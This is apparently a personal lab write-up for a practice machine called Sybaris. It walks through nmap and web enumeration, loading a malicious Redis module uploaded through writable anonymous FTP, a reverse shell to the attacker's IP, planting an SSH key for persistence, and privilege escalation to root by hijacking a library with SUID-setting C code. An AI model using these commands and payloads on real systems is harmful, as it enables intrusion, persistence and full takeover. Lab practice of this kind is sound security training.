## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.176.93
# HOSTNAME
sybaris
# OPERATING SYSTEM
CentOS Linux release 7.8.2003 (Core)
# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
21/tcp    open   ftp       syn-ack ttl 61 vsftpd 3.0.2
22/tcp    open   ssh       syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
80/tcp    open   http      syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
6379/tcp  open   redis     syn-ack ttl 61 Redis key-value store 5.0.9
```
# ENUMERATION
## PORT 21
```bash
# 21/tcp    open   ftp       syn-ack ttl 61 vsftpd 3.0.2
- sudo ftp ftp://anonymous:anonymous@$ip

Connected to 192.168.130.93.
220 (vsFTPd 3.0.2)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> dir
229 Entering Extended Passive Mode (|||10094|).
150 Here comes the directory listing.
drwxrwxrwx    2 0        0               6 Apr 01  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||10095|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> 

# Notes
- ftp-anon: Anonymous FTP login allowed (FTP code 230)
- _drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
```
## PORT 80
```bash
# 80/tcp    open   http      syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
- sudo curl -I $url

HTTP/1.0 500 Only GET and POST are supported
Date: Mon, 25 Nov 2024 05:36:50 GMT
Server: Apache/2.4.6 (CentOS) PHP/7.3.22
X-Powered-By: PHP/7.3.22
Set-Cookie: PHPSESSID=r8f02qa3sgjc8nmdb3ghmu43gv; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8

- sudo whatweb $url

http://192.168.130.93 [200 OK] Apache[2.4.6], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/7.3.22], IP[192.168.130.93], JQuery, MetaGenerator[HTMLy v2.7.5], PHP[7.3.22], PoweredBy[HTMLy,], Script[text/javascript], Title[Sybaris - Just another HTMLy blog], X-Powered-By[PHP/7.3.22], X-UA-Compatible[IE=edge]

- sudo curl -s $url/robots.txt | less
User-agent: *

# Disallow directories
Disallow: /config/
Disallow: /system/
Disallow: /themes/
Disallow: /vendor/
Disallow: /cache/

# Disallow files
Disallow: /changelog.txt
Disallow: /composer.json
Disallow: /composer.lock
Disallow: /composer.phar

# Disallow paths
Disallow: /search/
Disallow: /admin/

# Allow themes
Allow: /themes/*/css/
Allow: /themes/*/images/
Allow: /themes/*/img/
Allow: /themes/*/js/
Allow: /themes/*/fonts/

# Allow content images
Allow: /content/images/*.jpg
Allow: /content/images/*.png
Allow: /content/images/*.gif

- sudo curl -s $url| grep -oP 'href="\K[^"]+'
/favicon.ico
/sitemap.xml
/feed/rss
/themes/twentysixteen/genericons/genericons.css
/themes/twentysixteen/css/style.css
/themes/twentysixteen/css/ie.css
/themes/twentysixteen/css/ie8.css
/themes/twentysixteen/css/ie7.css

# Notes
- Server: Apache/2.4.6 (CentOS) PHP/7.3.22
- HTMLy v2.7.5

```
## PORT 6379 
```bash
# 6379/tcp  open   redis     syn-ack ttl 61 Redis key-value store 5.0.9
- Nmap 
- sudo nmap --script redis-info -sV -p 6379 $ip
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.9 (64 bits)
| redis-info: 
|   Version: 5.0.9
|   Operating System: Linux 3.10.0-1127.19.1.el7.x86_64 x86_64
|   Architecture: 64 bits
|   Process ID: 902
|   Used CPU (sys): 1.001888
|   Used CPU (user): 0.839643
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 562.22K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|   Client connections: 
|_    192.168.45.186

# Notes
- redis Version: 5.0.9

# Found module load redis command execution 
- Reference
https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#load-redis-module

- Downloaded https://github.com/n0b0dyCN/RedisModules-ExecuteCommand 
- Tried to compile module.so :( unable got more errors
- Forked the Project and made changes to file src/module.c
- with changes to the original repo created a repo to Command Execution


https://github.com/binaryxploit/redis-module-load-cmd-exec
```
## PORT 22
```bash
# 22/tcp    open   ssh       syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
```
## INITIAL FOOTHOLD
```bash
# Redis Module load
https://github.com/binaryxploit/redis-module-load-cmd-exec

# compile module.so
git clone https://github.com/binaryxploit/redis-module-load-cmd-exec.git
cd ./redis-module-load-cmd-exec
make

# Upload module.so to /var/ftp/pub 
- Reference https://www.linuxquestions.org/questions/red-hat-31/direct-access-on-pub-directory-for-anonymous-user-on-ftp-server-4175504168/
- ftp access with writable pub directory.
- PATH /var/ftp/pub/
ftp> put module.so

## Load the module via redis-cli tool for command execution
# Required tools
sudo apt-get install redis-tools -y

# Load module.so form uploaded path
192.168.130.93:6379> MODULE LOAD /var/ftp/pub/module.so

# List Loaded modules
192.168.130.93:6379> MODULE LIST

# Command Execution
192.168.130.93:6379> system.exec "id"

# Reverse Shell
sudo nc -nvlp 80
192.168.130.93:6379> system.rev 192.168.45.186 80

# Upgrade shell
- From Kali Machine
ssh-keygen -f myshell  
chmod 0600 myshell  
cat myshell.pub | pbcopy 

- From Reverse Shell
cd /home/pablo/
mkdir .ssh
cd .ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPPh8tzijwqePz8/StBFdsSvjJ25t4vHHQDTILRasDJo kali@kali" >> authorized_keys
chmod 0600 authorized_keys

# SSH as User pablo
sudo ssh -i mykey pablo@$ip
```
## PRIVILEGE ESCALATION
```bash
- Upload linpeas.sh via ftp and execute found
- Findings I
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils                                                                              
- Finding II
cat /etc/crontab
  *  *  *  *  * root       /usr/bin/log-sweeper                                               

- using strings on /usr/bin/log-sweeper  
- Found it uses utils.so withouth any path assigned
- Found /usr/bin/gcc

# LD PRELOAD Privesc
- Create a file utils with file contents below and upload via ftp
----------------------------------------------
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("chmod +s /usr/bin/find");
}
------------------------------------------------

ftp> put utils

[pablo@sybaris tmp]$ cp /var/ftp/pub/utils ./utils.c                                            
[pablo@sybaris tmp]$ gcc -fPIC -shared -nostartfiles -o /tmp/utils.so utils.c   
[pablo@sybaris tmp]$ cp utils.so /usr/local/lib/dev/utils.so                                  
[pablo@sybaris tmp]$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/find 
-rwsr-sr-x. 1 root root 199304 Oct 30  2018 /usr/bin/find

# GTFOBINS
/usr/bin/find . -exec /bin/sh -p \; -quit

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Mon Nov 25 10:51:46 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.130.93
Nmap scan report for 192.168.130.93
Host is up, received echo-reply ttl 61 (0.038s latency).
Scanned at 2024-11-25 10:51:48 IST for 117s
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE  SERVICE   REASON         VERSION
20/tcp    closed ftp-data  reset ttl 61
21/tcp    open   ftp       syn-ack ttl 61 vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.186
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
22/tcp    open   ssh       syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 21:94:de:d3:69:64:a8:4d:a8:f0:b5:0a:ea:bd:02:ad (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoWnaSOW2cc+sYUe6aqQSPWY9e9OWgerEomQZv6FujchbKcxcm6sPRTZJnGrPsDum5vx7otZDGG9Vc55NByLaLU9WoQTLPhnepGTMzbbg9DyIDR9HXFw3fX0s+vSvjvDo/Cz19gWKTB2lBfJgPa239Hp0NmaxOAXmJ+d+oUEmnhLmZ1wAQFvJ/9Ta2zt8q6KOvjykUcISuFwr741HwcudFS4Z84LsO+WbcIGtkTELLn9yFc3KiZraJYNi72rOKsxHip/98js8nEIsryRfo6sZexu4lxT5SchvDNQCirLSHsEIFyzde5Ym5FDf4hb831SwJqFg7qDO+wDT1/oZp/dnP
|   256 67:42:45:19:8b:f5:f9:a5:a4:cf:fb:87:48:a2:66:d0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLoSyEH4GdzHPYxZPUgKP068JBcpx5KSL1KzaMRo9xP4ai5QKUKJ+H2xu8atQdvkE0ul6GnDPVlZ5Flf/npwYWY=
|   256 f3:e2:29:a3:41:1e:76:1e:b1:b7:46:dc:0b:b9:91:77 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH4F/u2LLgVpGw2tr0bpe0MgbiV36HAzwcu5HqcuShJd
53/tcp    closed domain    reset ttl 61
80/tcp    open   http      syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
|_http-title: Sybaris - Just another HTMLy blog
|_http-favicon: Unknown favicon MD5: A4DA8778FE902EB34FD9A5D4C0A832E1
| http-methods: 
|_  Supported Methods: GET POST
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.22
|_http-generator: HTMLy v2.7.5
| http-robots.txt: 11 disallowed entries 
| /config/ /system/ /themes/ /vendor/ /cache/ 
| /changelog.txt /composer.json /composer.lock /composer.phar /search/ 
|_/admin/
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
6379/tcp  open   redis     syn-ack ttl 61 Redis key-value store 5.0.9
10091/tcp closed unknown   reset ttl 61
10092/tcp closed unknown   reset ttl 61
10093/tcp closed unknown   reset ttl 61
10094/tcp closed unknown   reset ttl 61
10095/tcp closed unknown   reset ttl 61
10096/tcp closed unknown   reset ttl 61
10097/tcp closed unknown   reset ttl 61
10098/tcp closed unknown   reset ttl 61
10099/tcp closed unknown   reset ttl 61
10100/tcp closed itap-ddtp reset ttl 61
Service Info: OS: Unix

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 25 10:53:45 2024 -- 1 IP address (1 host up) scanned in 119.42 seconds
```

